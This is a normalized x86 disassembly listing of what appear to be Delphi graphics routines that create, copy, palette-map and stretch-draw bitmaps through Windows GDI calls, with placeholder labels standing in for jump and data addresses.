mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a8c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4187ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424904
retn
sub_427b34
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403190
sub_427b54
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4278c0
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d1d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_427bb0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422cb0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4278c0
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4278c0
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_427bfc
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425598
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427cab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_427cb8
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_427d04
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4278c0
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424e04
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_428352
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026dc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42805c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424ce4
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424e04
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424e04
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424e04
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424e04
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_428303
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4282f2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4282d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424e04
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_427cb8
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425598
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424240
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424204
call sub_423580
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_424d5c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4282d7
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4282a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424e04
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026fc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423580
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424204
call sub_423580
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424204
call sub_423580
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424e04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a08
call sub_403a08
jmp r-xdata
sub_4282f9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428308
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403984
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428368
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4283cc
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4278c0
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4285c7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424e04
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42857f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_427d04
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4285d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425f84
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427b30
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_428640
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_428d50
mov eax [ esi + 0x28 ]
call sub_427b34
mov eax [ esi + 0x2c ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42867c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_428734
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ba4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428fc0
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_427b30
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_427b34
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418a84
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_42876c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428d50
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4287fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_428368
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_427d04
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428800
mov eax [ ebp - 0x8 ]
call sub_422cb0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403984
call sub_4039d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42882c
push ebx
mov ebx eax
mov eax ebx
call sub_428b20
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d1d0
pop ebx
retn
sub_42885c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41a924
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_428d50
lea eax [ ebx + 0x2c ]
call sub_40d1d0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428fc0
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4288d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424ae0
mov eax ebx
call sub_428e60
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_428c5c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_428b0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call SetStretchBltMode
mov eax ebx
call sub_428ba0
mov dl [ r-xdata ]
call sub_424ae0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_428e00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_428ba0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b13
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_428aa1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424e04
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_428ba0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424fa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
